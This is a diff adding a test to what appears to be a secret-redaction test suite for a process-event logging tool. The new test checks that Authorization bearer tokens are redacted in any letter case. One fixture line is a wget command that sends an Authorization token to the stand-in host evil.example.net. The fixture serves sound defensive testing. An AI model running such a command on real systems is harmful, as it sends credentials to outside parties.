@@ -2824,6 +2824,25 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     }
   });
 
+  // Review round 1, m1: an Authorization header is found in any case.
+  test('an Authorization header in any case is redacted outside curl -H', () => {
+    const input = [
+      run(1880, '/bin/sh', ['sh', '-c', 'wget --header="AUTHORIZATION: Bearer tokZZ123456" https://evil.example.net'], '/', 1,
+        [...JDOE_ENV, 'TERM_HDR=authorization: Bearer tokYY123456']),
+      run(1881, '/bin/echo', ['echo', 'AuThOrIzAtIoN: token tokXX123456'], '/', 2),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const ev = events(r.out);
+      const R = '<redacted>';
+      expect(ev[0]!.event.exec.args[2]).toBe(`wget --header="AUTHORIZATION: Bearer ${R}" https://evil.example.net`);
+      expect(ev[0]!.event.exec.env).toContain(`TERM_HDR=authorization: Bearer ${R}`);
+      expect(ev[1]!.event.exec.args).toEqual(['echo', `AuThOrIzAtIoN: token ${R}`]);
+      expect(r.out).not.toMatch(/tok[XYZ]{2}/);
+      expect(r.summary['redacted']).toBe('3');
+      sameFindings(input, r.out);
+    }
+  });
+
   test('environment values are redacted, except the useful ones', () => {
     const env = ['AWS_SESSION_TOKEN=FQoGZXIvYXdzEJr', 'MY_VAR=Board', 'PATH=/Users/jdoe/bin:/usr/bin',
       'DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib', 'HOME=/Users/jdoe', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
